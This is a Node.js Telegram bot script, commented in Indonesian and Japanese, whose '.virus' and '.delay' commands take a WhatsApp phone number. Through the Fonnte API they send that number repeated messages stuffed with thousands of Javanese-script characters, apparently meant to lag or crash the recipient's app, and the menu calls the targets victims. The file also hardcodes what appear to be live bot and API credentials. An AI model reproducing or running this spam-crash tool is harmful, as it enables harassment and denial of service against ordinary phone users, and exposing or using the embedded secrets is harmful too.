// bot_kirim2_mod_final.js
// npm install node-telegram-bot-api axios
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8499584477:AAEwTvcdjckwU_vHJ6C2dgUUfqoiKbmUFNQ';
const FONNTE_KEY    = process.env.FONNTE_KEY    || 'XX8gu3vf6FkFrx5aYfvL';
if (!TELEGRAM_TOKEN || !FONNTE_KEY) {
  console.error('❌ Harap set TELEGRAM_TOKEN & FONNTE_KEY');
  process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const sleep = ms => new Promise(r => setTimeout(r, ms));
const make20 = txt => Array.from({ length: 20 }).map(() => txt).join('\n');

// ================== EVENT PESAN ==================
bot.on('message', async msg => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();

  try {
    // ========== .menu ==========
    if (text === '.menu') {
      if (!fs.existsSync('./nina.jpg'))
        return bot.sendMessage(chatId, '❌ Foto nina.jpg tidak ditemukan!');

      const caption = `こんにちは、私はrifatによって作られたボット *lawliet bot* です\n\n*Dev:* @rifat M rifat\n*Name bot:* lawliet bot\n*Version:* v2
\nいらっしゃいませ`;

      const opts = {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: '📜 MENU BOT', callback_data: 'menu_bot' }]
          ]
        }
      };

      await bot.sendChatAction(chatId, 'upload_photo');
      await bot.sendPhoto(chatId, fs.readFileSync('./nina.jpg'), opts);
      return;
    }

    // ========== .virus ==========
    if (text.startsWith('.virus')) {
      const parts = text.split(/\s+/);
      const target = parts[1];
      const isi = parts.slice(2).join(' ') || 'ꦾ '.repeat(500);

      if (!target)
        return bot.sendMessage(chatId, 'Format: .virus 62812xxxx [isi]');

      const payload = make20(isi);
      const statusMsg = await bot.sendMessage(chatId, `🚀 Mengirim ke *${target}*...`, { parse_mode: 'Markdown' });

      let sukses = 0, gagal = 0;
      const total = 5;

      for (let i = 1; i <= total; i++) {
        try {
          const res = await axios.post(
            'https://api.fonnte.com/send',
            { target: target.trim(), message: payload },
            { headers: { Authorization: FONNTE_KEY }, timeout: 10000 }
          );
          if (res.data && res.data.status === true) sukses++;
          else gagal++;
        } catch {
          gagal++;
        }

        const bar = '▰'.repeat(i / 2) + '▱'.repeat((total - i) / 2);
        await bot.editMessageText(
          `📤 *Progress ${i}/${total}*\n${bar}\n✅ Sukses: ${sukses}\n❌ Gagal: ${gagal}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
        );

        await sleep(30);
      }

      if (fs.existsSync('./mani.jpg')) {
        const caption = `✅ *SUCCESS* send *${target}*\nMereka hanyalah rakyat biasa`;
        await bot.sendChatAction(chatId, 'upload_photo');
        await bot.sendPhoto(chatId, fs.readFileSync('./mani.jpg'), { caption, parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `✅ SUCCESS send ${target}\nMereka hanyalah rakyat biasa`);
      }
      return;
    }

    // ========== .delay ==========
    if (text.startsWith('.delay')) {
      const parts = text.split(/\s+/);
      const target = parts[1];
      const isi = parts.slice(2).join(' ') || 'ꦽ'.repeat(500);

      if (!target)
        return bot.sendMessage(chatId, 'Format: .delay 62812xxxx [isi]');

      const payload = make20(isi);
      const statusMsg = await bot.sendMessage(chatId, `🐍 Mengirim ke *${target}*...`, { parse_mode: 'Markdown' });

      let sukses = 0, gagal = 0;
      const total = 5; // kirim 10 kali

      for (let i = 1; i <= total; i++) {
        try {
          const res = await axios.post(
            'https://api.fonnte.com/send',
            { target: target.trim(), message: payload },
            { headers: { Authorization: FONNTE_KEY }, timeout: 10000 }
          );
          if (res.data && res.data.status === true) sukses++;
          else gagal++;
        } catch {
          gagal++;
        }

        const bar = '▰'.repeat(Math.floor((i / total) * 10)) + '▱'.repeat(10 - Math.floor((i / total) * 10));
        await bot.editMessageText(
          `📤 *Progress ${i}/${total}*\n${bar}\n✅ Sukses: ${sukses}\n❌ Gagal: ${gagal}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
        );

        await sleep(30); // jeda 1 detik
      }

      if (fs.existsSync('./mani.jpg')) {
        const caption = `✅ *SUCCESS* send *${target}*\nPesan: halokids`;
        await bot.sendChatAction(chatId, 'upload_photo');
        await bot.sendPhoto(chatId, fs.readFileSync('./mani.jpg'), { caption, parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `✅ SUCCESS send ${target}\nPesan: halokids`);
      }
      return;
    }

  } catch (err) {
    console.error('Error:', err.message);
    await bot.sendMessage(chatId, '❌ Terjadi kesalahan. Cek koneksi atau API key.');
  }
});

// ================== CALLBACK MENU ==================
bot.on('callback_query', async query => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === 'menu_bot') {
    if (!fs.existsSync('./mama.jpg'))
      return bot.sendMessage(chatId, '❌ Foto mama.jpg tidak ditemukan!');

    const caption = `これを入力してくださ 私の名前はローリエット。私に殺させる犠牲者を送ってはならない。い\n______________________
*MENU*
________________
.*virus* 62×××××\n______________________
.*delay* 62×××××\n______________________
幸運を祈ります！`;

    await bot.sendChatAction(chatId, 'upload_photo');
    await bot.sendPhoto(chatId, fs.readFileSync('./mama.jpg'), { caption, parse_mode: 'Markdown' });
    await bot.answerCallbackQuery(query.id, { text: '📋 Menampilkan menu bot...' });
  }
});
